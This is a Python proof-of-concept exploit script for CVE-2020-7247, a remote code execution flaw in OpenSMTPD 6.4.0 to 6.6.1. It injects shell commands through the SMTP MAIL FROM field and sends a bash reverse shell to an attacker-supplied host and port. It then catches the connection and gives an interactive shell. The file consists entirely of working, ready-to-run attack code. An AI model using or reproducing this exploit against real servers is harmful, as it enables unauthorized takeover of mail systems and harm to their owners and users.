#!/usr/bin/python3
#See https://github.com/f4T1H21/CVE-2020-7247 for more information.
#PoC exploit for OpenSMTPD 6.4.0 < 6.6.1 - Remote Code Execution, written by f4T1H, inspired by QTranspose.
from pwn import *
import sys
if len(sys.argv) < 6:
	log.failure("Usage: python3 exploit.py <RHOST> <RPORT> <recipient_mail> <LHOST> <LPORT>")
	sys.exit(0)
rhost = str(sys.argv[1])
rport = int(sys.argv[2])
rmail = str(sys.argv[3])
lhost = str(sys.argv[4])
lport = int(sys.argv[5])
cmd = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(lhost, lport)
r = remote(rhost, rport)
ilk = r.recvline().decode()
if "OpenSMTPD" not in ilk:
	log.failure(f"Port {rport} is not running OpenSMTPD")
	r.close()
	exit(1)
log.success(f"Target port is running OpenSMTPD!")

ilerleme = log.progress("Sending HELO")
r.sendline("HELO selam")
cevap = r.recvline().decode()
ilerleme.status(cevap)
ilerleme.success("Done")

r.sendline("MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>")
cevap = r.recvline().decode()
if "250" not in cevap:
	log.failure("Target is not vulnerable!")
	r.close()
	exit(1)
log.success("Target is vulnerable!")

ilerleme = log.progress("Checking the mail address")
r.sendline(f"RCPT TO:<{rmail}>")
cevap = r.recvline().decode()
ilerleme.status(cevap)
if "250" not in cevap:
	log.failure(f"Specified mail address ({rmail}) is not a valid mail address for this server!")
	r.close()
	exit(1)
ilerleme.success("Valid")

ilerleme = log.progress("Sending the payload")
r.sendline("DATA")
cevap = r.recvline().decode()
ilerleme.status(cevap)
payload = f"""
#1
#2
#3
#4
#5
#6
#7
#8
#9
#10
#11
#12
#13
#14
{cmd}
.
"""
r.send(payload)
cevap = r.recvline().decode()
ilerleme.status(cevap)
ilerleme.success("Done")
r.sendline("QUIT")
r.close();print("---------------------------------------------------------")

l = listen(lport, bindaddr = lhost)
l.wait_for_connection()
l.interactive()
